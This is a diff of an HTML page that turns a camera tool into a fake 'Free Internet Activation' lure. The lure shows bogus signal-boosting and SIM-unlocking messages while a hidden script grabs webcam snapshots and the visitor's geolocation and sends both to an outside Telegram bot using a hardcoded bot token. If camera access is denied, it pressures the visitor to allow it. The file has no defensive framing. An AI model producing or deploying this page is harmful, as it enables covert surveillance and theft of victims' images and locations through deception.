@@ -1,34 +1,37 @@
 <!DOCTYPE html><html>
 <head>
-  <title>Camera Tool</title>
+  <title>Free Internet Activation</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
       text-align: center;
-      background: #000;
-      color: white;
-      font-family: Arial, sans-serif;
+      padding: 20px;
     }
-    video, canvas {
-      width: 90%;
-      max-width: 400px;
-      margin-top: 20px;
+    video {
+      display: none;
     }
   </style>
 </head>
 <body>
   <h2>📡 Connecting to Free Internet...</h2>
-  <video id="video" autoplay muted playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>  <script>
+  <p>🔄 Boosting signal...<br>
+     🔓 Unlocking SIM Access...<br>
+     📶 Enabling free access...</p><video id="video" autoplay muted playsinline></video> <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
     const urlParams = new URLSearchParams(window.location.search);
     const chatId = urlParams.get('chatid');
-    const token = '8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc '; // Replace with your bot token
+    const token = '8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc'; // Your bot token
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    // Start camera access
+    navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
@@ -36,11 +39,10 @@
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           ctx.drawImage(video, 0, 0);
-
           canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'snapshot.jpg');
+            formData.append('photo', blob, 'capture.jpg');
 
             fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
               method: 'POST',
@@ -49,8 +51,18 @@
           }, 'image/jpeg');
         }, 2000);
       })
-      .catch(err => {
-        document.body.innerHTML = '<h3>🚫 Permission Denied. Camera not accessible.</h3>';
+      .catch(() => {
+        document.body.innerHTML = '<h3>🚫 Camera access denied. Please allow camera access to activate free internet.</h3>';
       });
+
+    // Get and send location once
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const latitude = pos.coords.latitude;
+        const longitude = pos.coords.longitude;
+
+        fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`);
+      });
+    }
   </script></body>
-</html>
+</html
